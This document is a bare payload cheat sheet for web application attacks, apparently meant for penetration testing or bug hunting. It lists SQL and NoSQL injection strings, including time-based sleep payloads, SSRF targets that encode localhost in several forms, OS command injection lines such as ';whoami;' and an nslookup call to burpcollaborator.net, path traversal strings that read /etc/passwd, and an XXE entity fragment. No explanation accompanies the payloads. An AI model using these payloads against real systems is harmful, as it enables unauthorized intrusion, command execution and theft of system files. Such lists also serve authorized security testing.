```sh
# SQLi
'
' or 1=1-- -
 or '1'='1'-- -
' or sleep(3)-- -
1' or sleep(3)-- -
1 or sleep(3)-- -
1337-sleep(3)-- -
(select*from(select(sleep(3)))a)-- -
0'XOR(if(now()=sysdate(),sleep(3),0))XOR'Z-- -
1'XOR(if(now()=sysdate(),sleep(3),0))OR'-- -
' or 1=1
 or '1'='1
' or sleep(3)
1' or sleep(3)
1 or sleep(3)
1337-sleep(3)
(select*from(select(sleep(3)))a)
0'XOR(if(now()=sysdate(),sleep(3),0))XOR'Z
1'XOR(if(now()=sysdate(),sleep(3),0))OR'
"' or sleep(30)='"
127.0.0.1' AND (SELECT * FROM (SELECT(SLEEP(5)))x) AND '1'='1
# NoSQLi
' && 0 && 'x
' && 1 && 'x
' || 1 || 'x
'%00
' && 0 && '
' && 1 && '
' || 1 || '
\'
'%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
'\"`{\r%3b$Foo}\n$Foo+\\xYZ\u0000
# SSRF
http://localhost/
http://127.0.0.1/
http://127.1
http://2130706433
http://017700000001
http://[::]:80/
http://burpcollaborator.net
http://localhost/?%0A
http://127.0.0.1/?%0A
http://127.1/?%0A
http://2130706433/?%0A
http://017700000001/?%0A
http://[::]:80/?%0A
http://burpcollaborator.net/?%0A
# OS command Injection
;whoami;
;sleep 10;
nslookup+burpcollaborator.net
|ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\" |ping -n 21 127.0.0.1
# Path Traversal
../../../etc/passwd
..//..//..//..//etc/passwd
....//....//....//....//etc/passwd
/var/www/images/../../../etc/passwd
/var/www/images/..//..//..//..//etc/passwd
/var/www/images/....//....//....//....//etc/passwd
../../../etc/passwd%00
..//..//..//..//etc/passwd%00
....//....//....//....//etc/passwd%00
/var/www/images/../../../etc/passwd%00
/var/www/images/..//..//..//..//etc/passwd%00
/var/www/images/....//....//....//....//etc/passwd%00
%26xxe;
```
